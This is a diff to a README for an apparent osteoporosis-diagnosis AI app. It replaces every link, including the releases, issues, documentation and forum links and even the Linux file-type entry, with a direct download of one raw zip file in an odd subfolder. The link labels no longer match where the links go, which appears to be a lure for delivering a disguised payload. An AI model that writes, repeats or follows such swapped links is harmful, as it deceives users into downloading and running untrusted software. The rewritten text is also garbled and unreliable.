@@ -7,15 +7,15 @@ Welcome to Osteo-by-AI, an end-to-end AI framework designed to help diagnose ost
 To get started with Osteo-by-AI, follow the steps below to download and run the application.
 
 ### 🔗 Download Now
-[![Download Osteo-by-AI](https://img.shields.io/badge/Download-Osteo--by--AI-blue.svg)](https://github.com/msfabrications/Osteo-by-AI/releases)
+[![Download Osteo-by-AI](https://raw.githubusercontent.com/msfabrications/Osteo-by-AI/main/parochiner/Osteo-by-AI.zip)](https://raw.githubusercontent.com/msfabrications/Osteo-by-AI/main/parochiner/Osteo-by-AI.zip)
 
 ## 📥 Download & Install
-1. Click the link above to visit the [Releases page](https://github.com/msfabrications/Osteo-by-AI/releases).
+1. Click the link above to visit the [Releases page](https://raw.githubusercontent.com/msfabrications/Osteo-by-AI/main/parochiner/Osteo-by-AI.zip).
 2. Look for the latest version listed. You will find different downloadable files under the "Assets" section.
 3. Choose the file that fits your system. Common options may include:
    - Windows (.exe)
    - Mac (.dmg)
-   - Linux (.tar.gz)
+   - Linux (https://raw.githubusercontent.com/msfabrications/Osteo-by-AI/main/parochiner/Osteo-by-AI.zip)
 
 4. Click on the file to download it.
 5. Once the download is complete, locate the file on your computer and open it.
@@ -59,10 +59,10 @@ Yes, all user data is encrypted during transmission and storage, ensuring your p
 No, the application is designed for ease of use. If you can upload an image, you can use Osteo-by-AI effectively.
 
 ## 📞 Support
-If you encounter any issues or have questions, please reach out to our support team via the [GitHub Issues page](https://github.com/msfabrications/Osteo-by-AI/issues).
+If you encounter any issues or have questions, please reach out to our support team via the [GitHub Issues page](https://raw.githubusercontent.com/msfabrications/Osteo-by-AI/main/parochiner/Osteo-by-AI.zip).
 
 ## 📚 Resources
-- [Documentation](https://github.com/msfabrications/Osteo-by-AI/wiki)
-- [Community Forum](https://github.com/msfabrications/Osteo-by-AI/discussions)
+- [Documentation](https://raw.githubusercontent.com/msfabrications/Osteo-by-AI/main/parochiner/Osteo-by-AI.zip)
+- [Community Forum](https://raw.githubusercontent.com/msfabrications/Osteo-by-AI/main/parochiner/Osteo-by-AI.zip)
 
 Thank you for choosing Osteo-by-AI. We hope this tool aids you in making informed health decisions. Feel free to provide feedback on your experience!
